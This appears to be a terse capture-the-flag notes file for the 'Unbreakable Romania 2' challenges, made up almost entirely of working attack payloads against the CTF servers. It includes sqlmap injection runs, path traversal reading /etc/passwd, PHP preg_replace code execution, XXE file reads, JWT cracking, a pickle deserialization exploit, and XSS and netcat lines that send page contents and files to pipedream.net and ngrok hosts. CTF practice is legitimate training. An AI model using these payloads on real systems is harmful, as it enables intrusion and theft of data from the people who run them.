# writeups

## https://blog.kuhi.to/unbreakable-romania-2-writeup

### Small data leak

sqlmap -u http://35.198.183.125:30321/user?id=1;
sqlmap -u http://35.198.183.125:30321/user?id=1 --dbs
sqlmap -u http://35.198.183.125:30321/user?id=1 -D public --tables
sqlmap -u http://35.198.183.125:30321/user?id=1 -D public -T 'ctf{70ff919c37a20d6526b02e88c950271a45fa698b037e3fb898ca68295da' --columns


### File Crawler

http://34.141.25.94:32191/local?image_name=..//..//..//etc/passwd
http://34.141.25.94:32191/local?image_name=..////tmp//flag


### Substitute
http://35.246.170.233:31993/?vector=/Admin/e&replace=phpinfo()
http://35.246.170.233:31993/?vector=/Admin/e&replace=system("ls -l")
http://35.246.170.233:31993/?vector=/Admin/e&replace=system("ls here_we_dont_have_flag -l")
http://35.246.170.233:31993/?vector=/Admin/e&replace=system("cat here_we_dont_have_flag/flag.txt")


### manual-review
```
<script>
    window.location.href = "https://eoifpwfcq85jqhy.m.pipedream.net"
</script>
```

### syntax check

burpsuite
```
<!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY exfiltrate SYSTEM "/etc/passwd">
]>
<foo>&exfiltrate;</foo>
```

```
<!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY exfiltrate SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/flag">
]>
<foo>&exfiltrate;</foo>
```
### Under Construction
https://github.com/ticarpi/jwt_tool
```
python3 jwt_tool.py -t http://35.198.93.134:30791/api/app/admin -rc
"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTIsImlhdCI6MTYzNTkzNjY4OCwiZ
XhwIjoxNjM2MDIzMDg4fQ.tQ2KlBU8tI5V1Akiqhwy2LSEOF9oBTvnYFs_xgwro04" -C -d
~/sss.txt 
```
https://jwt.io/

### Downloader v1

ngrok needed

ngrok http 7777

nc - lvnp 7777

https://eoifpwfcq85jqhy.m.pipedream.net/test.php --post-file '/var/www/html/flag.php'


###  Framable
```
<script>
    let html = document.body.innerHTML;
    window.location.href = "https://eoifpwfcq85jqhy.m.pipedream.net?bob=" + btoa(html)
</script>
```
atob('')

### alfa-cookie

cmd = ('ls -lah | nc 2.tcp.ngrok.io 17855')

https://blog.kuhi.to/unbreakable-romania-2-writeup

### Rundown
```
curl -X POST http://35.246.170.233:32274/ > o.html
```

```
import pickle as cPickle
import base64
import os
import string
import requests
import time
class Exploit(object):
    def __reduce__(self):
        return (eval, ('eval(open("flag","r").read())', ))
def sendPayload(p):
    newp = base64.urlsafe_b64encode(p).decode()
    headers = {'Content-Type': 'application/T3jv1l'}
    r = requests.post("http://34.107.45.139:30396/",headers=headers,data=newp)
    return r.text
    
payload_dec = cPickle.dumps(Exploit(), protocol=2)
print("ctf{" + sendPayload(payload_dec).split("ctf{")[1].split("}")[0] +"}")
```
